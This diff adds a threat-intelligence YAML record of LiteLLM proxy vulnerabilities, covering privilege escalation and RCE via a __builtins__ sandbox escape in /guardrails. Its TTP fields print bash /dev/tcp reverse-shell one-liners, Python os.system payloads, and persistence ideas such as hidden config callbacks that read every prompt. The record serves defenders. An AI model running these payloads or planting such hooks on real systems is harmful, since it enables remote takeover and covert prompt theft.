@@ -1,0 +1,66 @@
+title: 'LiteLLM Exploit Chain: Privilege Escalation and Remote Code Execution via
+  Route Bypass'
+description: Multiple vulnerabilities in LiteLLM proxy allow privilege escalation
+  from internal_user to proxy_admin via /user/update and /user/bulk_update, and remote
+  code execution via the /guardrails custom code execution endpoint using __builtins__
+  sandbox escape. Affected versions include up to v1.83.10-stable and v1.83.14-stable.
+attribution: ''
+malware_families: []
+cves:
+- CVE-2026-47101
+- CVE-2026-40217
+- CVE-2026-47102
+- CVE-2026-40933
+ttps:
+  processes: []
+  command_lines:
+  - bash -c "bash -i >& /dev/tcp/10.10.10.221/6666 0>&1"
+  - bash -c "bash -i >& /dev/tcp/172.16.49.1/6666 0>&1"
+  - npx -c "bash -c \"bash -i >& /dev/tcp/172.16.49.1/6666 0>&1\""
+  - id > /tmp/pwned
+  powershell: []
+  scripts:
+  - "__builtins__['__import__']('os').system('bash -c \"bash -i >& /dev/tcp/10.10.10.221/6666\
+    \ 0>&1\"')\ndef apply_guardrail(inputs, request_data, input_type):\n    __builtins__['__import__']('os').system('id\
+    \ > /tmp/pwned')\n    return allow()"
+  - __builtins__['__import__']('os').system('bash -c "bash -i >& /dev/tcp/10.10.10.221/6666
+    0>&1"')
+  - __builtins__['__import__']('os').system('id > /tmp/pwned')
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - LiteLLM proxy -> 10.10.10.221:6666
+  - LiteLLM proxy -> 172.16.49.1:6666
+  - bash -> 10.10.10[.]221:6666
+  - bash -> 172.16.49[.]1:6666
+  file_activity:
+  - /tmp/pwned
+  - litellm/proxy/auth/route_checks.py
+  persistence:
+  - Attacker registers a LiteLLM callback hook via litellm_settings.callbacks in config.yaml
+    that fires on every request, invisible in the admin UI, able to read every prompt
+    and response and inject tool calls
+  - Registering a malicious callback under litellm_settings.callbacks in config.yaml
+    that fires on every request, invisible to the admin console
+  - MCP stdio server injection via proxy_admin privileges to execute reverse shell
+    on every MCP connection
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls:
+  - /key/generate
+  - /key/update
+  - /key/regenerate
+  - /key/service-account/generate
+  - /user/update
+  - /user/bulk_update
+  - /guardrails
+  - /guardrails/test_custom_code
+authors:
+- Obsidian Security
+- X41 D-Sec
+reference: https://www.obsidiansecurity.com/blog/litellm-privilege-escalation-rce
+date_of_publication: April 25, 2026
+file_creation_date: June 17, 2026
